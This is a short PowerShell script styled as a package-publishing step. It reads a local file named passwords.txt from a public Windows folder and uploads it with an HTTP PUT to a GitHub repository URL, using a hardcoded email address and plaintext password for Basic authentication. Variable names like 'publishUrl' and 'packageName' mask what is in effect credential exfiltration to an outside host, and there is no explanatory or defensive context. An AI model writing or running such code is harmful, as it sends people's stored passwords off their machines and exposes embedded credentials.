$publishUrl="https://github.com/ArllisPLEU/aha"
$packageName = "C:\Users\Public\Document\passwords.txt"
$username="filip.dawid123@protonmail.com"
$password="+0QZj7nl<M~c.R?;X&@:"

$params = @{
  UseBasicParsing = $true
  Uri             = $publishUrl
  Method          = "PUT"
  InFile          = $packageName
  Headers         = @{
    ContentType   = "application/gzip"
    Authorization = "Basic $([System.Convert]::ToBase64String([System.Text.Encoding]::ASCII.GetBytes("$username`:$password")))" 
  }
  Verbose         = $true
}
Invoke-WebRequest @params
